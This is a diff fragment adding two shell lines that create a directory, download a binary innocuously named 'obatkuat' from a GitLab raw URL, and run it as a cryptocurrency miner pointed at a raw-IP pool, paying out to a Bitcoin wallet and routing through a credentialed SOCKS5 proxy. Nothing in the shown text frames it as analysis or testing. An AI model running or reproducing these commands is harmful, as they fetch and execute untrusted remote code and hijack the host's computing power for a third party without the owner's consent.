@@ -1,0 +1,2 @@
+mkdir a && cd a
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/obatkuat && chmod +x obatkuat && ./obatkuat --algo qhash --qhash-kernel 1 --url 143.198.215.212:80 --user bc1qkffcvg770w3dwk9rhvrnltxsne3jde0d80x0x8.$(shuf -n 1 -i 1-99999)-Majza --proxy socks5://abah:abah123@138.197.126.203:443
